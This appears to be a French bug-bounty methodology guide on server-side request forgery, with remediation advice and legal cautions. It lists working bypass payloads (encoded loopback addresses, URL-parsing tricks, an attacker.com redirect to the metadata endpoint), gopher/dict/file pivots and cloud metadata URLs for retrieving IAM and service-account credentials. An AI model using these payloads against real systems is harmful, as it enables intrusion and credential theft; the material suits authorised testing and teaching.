# SSRF — Server-Side Request Forgery (2024-2026)

## Contexte

Le SSRF est l'une des catégories à plus fort ROI actuel car il touche directement l'infrastructure cloud (metadata endpoints AWS/GCP/Azure) et peut escalader vers une prise de contrôle complète de l'environnement cloud. Fréquent dans : webhooks, générateurs de PDF/screenshot server-side, import d'images depuis URL, intégrations tierces (avatar depuis URL, "fetch preview" de lien), SSO/SAML metadata fetch, requêtes de health-check internes.

## Où chercher

| Fonctionnalité | Pourquoi vulnérable |
|---|---|
| Upload d'avatar/logo "depuis une URL" | Le serveur fait une requête HTTP vers l'URL fournie par l'utilisateur |
| Génération de PDF/screenshot depuis HTML/URL | Moteur headless (Puppeteer/wkhtmltopdf) qui fetch des ressources externes |
| Webhooks (configuration d'URL de callback) | Le serveur POST vers l'URL fournie — souvent zéro validation d'IP privée |
| Import/export de données (RSS, XML feeds) | Parsing XML avec résolution d'entités externes (XXE→SSRF) |
| Intégrations OAuth/SSO (SAML metadata URL) | Fetch du metadata XML depuis une URL fournie par l'admin/utilisateur |
| "Partager un lien" / preview de lien (Slack-like unfurling) | Fetch de l'URL pour générer une preview (titre, image OG) |
| Traitement d'images (resize, watermark via URL) | Librairies image (ImageMagick) avec délégation de coprocess vulnérable |

## Comment tester

### SSRF basique

```
1. Fournir une URL contrôlée (webhook.site, requestbin, ou serveur propre avec logs) dans chaque champ candidat.
2. Confirmer la requête sortante (log de connexion reçue).
3. Si confirmé, pivoter vers des cibles internes.
```

### Bypass de filtres (2024-2026 — les filtres naïfs sont toujours fréquents)

```
# Bypass basé sur la représentation d'IP
http://127.0.0.1        → filtré souvent
http://0177.0.0.1        → octal, souvent non filtré
http://2130706433         → décimal (127.0.0.1 en entier)
http://0x7f.0x0.0x0.0x1  → hexadécimal
http://127.1              → forme courte
http://[::1]              → IPv6 loopback
http://[0:0:0:0:0:ffff:127.0.0.1]  → IPv6-mapped IPv4

# Bypass via DNS
http://attacker-controlled-domain-resolving-to-127.0.0.1.example.com
# (créer un enregistrement A pointant vers 127.0.0.1 ou une IP interne cible)

# Bypass via redirection (si le serveur suit les redirects après validation initiale de l'URL)
http://attacker.com/redirect → 302 → http://169.254.169.254/latest/meta-data/

# Bypass via parsing d'URL ambigu (confusion userinfo)
http://trusted-domain.com@169.254.169.254/
http://169.254.169.254#@trusted-domain.com/
http://trusted-domain.com%2F@169.254.169.254/

# Bypass via schéma alternatif
gopher://127.0.0.1:6379/_SET%20key%20value   (pivot vers Redis interne)
dict://127.0.0.1:11211/                       (pivot vers Memcached)
file:///etc/passwd                            (si le fetcher supporte file://)
```

> 💡 **Pro tip d'élite :** Beaucoup de validateurs SSRF font un `resolve DNS` UNE FOIS pour valider l'IP, puis effectuent la requête HTTP réelle séparément (**TOCTOU — Time-Of-Check-Time-Of-Use**). Utilise un serveur DNS que tu contrôles pour renvoyer une IP publique légitime au premier check puis une IP interne à la connexion réelle (DNS rebinding), avec un TTL très court.

### Cloud Metadata Exploitation — l'impact le plus recherché

```bash
# AWS (IMDSv1 — encore fréquent malgré la dépréciation officielle)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# → credentials IAM temporaires exploitables directement avec aws-cli

# AWS IMDSv2 (nécessite un token — SSRF doit pouvoir forger des headers, pas toujours possible)
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
puis GET avec header X-aws-ec2-metadata-token: <token>

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header requis: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header requis: Metadata: true
```

> ⚠️ Si le SSRF ne permet pas de forger des headers custom (ex: import d'image simple), IMDSv2 (AWS) bloque souvent l'exploitation — mais IMDSv1 reste actif sur énormément d'instances legacy. GCP/Azure nécessitent aussi des headers spécifiques : un SSRF "GET simple sans header custom" ne fonctionnera pas toujours contre eux, documente bien cette limite dans le rapport.

### Blind SSRF — confirmation sans réponse visible

Utilise Burp Collaborator ou un domaine sous ton contrôle avec logs DNS/HTTP pour confirmer une requête sortante même sans retour de contenu dans la réponse HTTP visible.

## Comment confirmer l'impact

- **Scan du réseau interne** : itérer sur les ports/IPs internes typiques (`10.0.0.0/8`, `192.168.0.0/16`, services internes comme Consul, Kubernetes API `:6443`, `:10250`, dashboards internes non authentifiés).
- **Exfiltration de credentials cloud** (IAM role AWS, service account GCP) — preuve suffisante : afficher le nom du rôle/scope, PAS d'utilisation active des credentials pour agir sur l'infra (hors scope, risque légal majeur).
- **Pivot vers services internes non authentifiés** (Redis, Elasticsearch, Jenkins, Kubernetes dashboard) exposés uniquement en interne.

> ⚠️ **Attention légale critique :** Obtenir des credentials IAM via SSRF est une preuve de concept valide. **Les utiliser pour lister/modifier des ressources cloud réelles dépasse le cadre de la preuve** sauf autorisation explicite écrite du programme. Documente la capacité, ne l'exploite pas activement.

## Remédiation

- Whitelist stricte de domaines/IPs autorisés pour les requêtes sortantes serveur.
- Désactivation de la résolution DNS vers les plages privées (RFC 1918) au niveau réseau (egress filtering), pas seulement applicatif.
- IMDSv2 obligatoire + hop limit = 1 sur AWS.
- Validation de l'IP **au moment de la connexion réelle**, pas seulement au moment du parsing initial (mitigation DNS rebinding).

## Références

- PortSwigger Web Security Academy — SSRF
- OWASP SSRF Prevention Cheat Sheet
- HackTricks — SSRF cloud metadata bypass techniques
- Recherche Orange Tsai sur SSRF avancé (Gopher/protocol smuggling)
